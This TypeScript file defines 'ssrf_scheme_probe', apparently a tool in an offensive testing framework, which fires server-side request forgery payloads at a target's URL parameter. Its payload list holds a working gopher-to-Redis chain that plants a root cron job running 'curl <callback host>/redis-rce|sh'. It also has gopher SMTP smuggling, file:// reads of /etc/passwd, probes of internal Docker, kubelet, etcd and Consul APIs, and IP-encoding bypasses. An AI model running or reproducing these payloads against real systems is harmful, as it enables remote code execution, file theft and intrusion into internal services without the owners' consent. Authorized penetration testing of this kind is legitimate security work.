// T48 — ssrf_scheme_probe
// Alternative scheme SSRF: gopher://, file://, dict://, ldap://, jar://.
// Includes encoded-newline payloads for SMTP/Redis smuggling via gopher.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'ssrf_scheme_probe',
  description:
    'Probe for SSRF via alternative URI schemes. Tests gopher://, file://, dict://, ' +
    'ldap://, jar://, netdoc://, sftp://, tftp://. Gopher payloads include encoded-newline ' +
    'SMTP and Redis command smuggling. Detects scheme-level SSRF that HTTP-only allow-lists miss.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',             type: 'string', required: true,  description: 'Target URL (with SSRF parameter)' },
    { name: 'ssrf_parameter',  type: 'string', required: true,  description: 'Parameter name that controls the fetched URL' },
    { name: 'oob_host',        type: 'string', required: true,  description: 'OOB callback host' },
    { name: 'method',          type: 'string', required: false, description: 'HTTP method', default: 'GET' },
    { name: 'headers',         type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',      type: 'number', required: false, description: 'Per-request timeout ms', default: 15000 },
  ],
};

const SCHEME_PAYLOADS = (oobHost: string) => [
  // File read
  { name: 'file_etc_passwd',        value: 'file:///etc/passwd',                                  note: 'Local file read via file://' },
  { name: 'file_windows_hosts',     value: 'file:///c:/windows/system32/drivers/etc/hosts',       note: 'Windows file read' },
  // Gopher SSRF → Redis RCE
  { name: 'gopher_redis_rce',       value: `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0a%0a*/1 * * * * root curl ${oobHost}/redis-rce|sh%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a`, note: 'Gopher → Redis → cron RCE' },
  // Gopher SSRF → SMTP injection
  { name: 'gopher_smtp',            value: `gopher://127.0.0.1:25/_HELO%20genesis%0d%0aMAIL%20FROM:%3cgenesis@${oobHost}%3e%0d%0aRCPT%20TO:%3cadmin@localhost%3e%0d%0aDATA%0d%0aSubject:SSRF-TEST%0d%0a%0d%0aSMTP%20SSRF%20confirmed%0d%0a.%0d%0aQUIT%0d%0a`, note: 'Gopher → SMTP email injection' },
  // Dict protocol
  { name: 'dict_localhost',         value: 'dict://127.0.0.1:11211/stat',                        note: 'Dict → Memcached stat command' },
  // LDAP
  { name: 'ldap_localhost',         value: 'ldap://127.0.0.1:389/%00',                           note: 'LDAP scheme → internal LDAP server probe' },
  // Internal service discovery
  { name: 'http_consul',            value: 'http://127.0.0.1:8500/v1/agent/self',                 note: 'Consul API (common internal service)' },
  { name: 'http_etcd',              value: 'http://127.0.0.1:2379/v2/keys',                       note: 'etcd key-value store API' },
  { name: 'http_k8s',               value: 'http://127.0.0.1:10250/pods',                         note: 'Kubernetes kubelet API' },
  { name: 'http_docker',            value: 'http://127.0.0.1:2375/containers/json',               note: 'Docker daemon API (unauthenticated)' },
  { name: 'http_redis_cli',         value: 'http://127.0.0.1:6379/',                              note: 'Redis HTTP protocol (some versions respond)' },
  // IPv6 bypass
  { name: 'ipv6_loopback',          value: 'http://[::1]/',                                       note: 'IPv6 loopback bypass' },
  { name: 'decimal_ip_loopback',    value: 'http://2130706433/',                                  note: 'Decimal IP 127.0.0.1' },
  { name: 'octal_ip',               value: 'http://0177.0.0.1/',                                  note: 'Octal IP 127.0.0.1' },
];

export const ssrfSchemeProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const ssrfParam = String(params.ssrf_parameter || '');
    const oobHost = String(params.oob_host || '');
    const method = String(params.method || 'GET').toUpperCase();
    const timeoutMs = Number(params.timeout_ms || 15000);

    if (!url || !ssrfParam) return { output: 'url and ssrf_parameter required', parsed: { error: 'missing_params' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const payloads = SCHEME_PAYLOADS(oobHost);
    const results: Array<{ name: string; value: string; status: number; body_excerpt: string; time_ms: number; interesting: boolean; note: string; error?: string }> = [];

    for (const payload of payloads) {
      const start = Date.now();
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        let fetchUrl: string;
        let body: string | undefined;
        if (method === 'GET') {
          const u = new URL(url);
          u.searchParams.set(ssrfParam, payload.value);
          fetchUrl = u.toString();
        } else {
          fetchUrl = url;
          body = JSON.stringify({ [ssrfParam]: payload.value });
          headers['Content-Type'] = 'application/json';
        }
        const resp = await fetch(fetchUrl, { method, headers, body, signal: controller.signal });
        clearTimeout(timer);
        const text = await resp.text();
        const interesting = text.includes('root:') || text.includes('+PONG') || text.includes('SMTP') || text.includes('consul') || resp.status === 200 && text.length > 50;
        results.push({ name: payload.name, value: payload.value.substring(0, 60), status: resp.status, body_excerpt: text.substring(0, 100).replace(/\s+/g, ' '), time_ms: Date.now() - start, interesting, note: payload.note });
      } catch (err) {
        results.push({ name: payload.name, value: payload.value.substring(0, 60), status: 0, body_excerpt: '', time_ms: Date.now() - start, interesting: false, note: payload.note, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `ssrf_scheme_probe — ${payloads.length} scheme payloads, param="${ssrfParam}"`,
      `Target: ${url.substring(0, 80)}`,
      `Interesting: ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ INTERESTING' : (r.error ? '✗ ERR        ' : '  ·          ');
      lines.push(`  ${flag}  [${r.name.padEnd(24)}]  status=${r.status}  ${r.note}`);
      if (r.interesting && r.body_excerpt) lines.push(`          body: "${r.body_excerpt.substring(0, 80)}"`);
    }

    return {
      output: lines.join('\n'),
      parsed: { total: results.length, interesting_count: interesting.length, interesting, results },
    };
  },
};
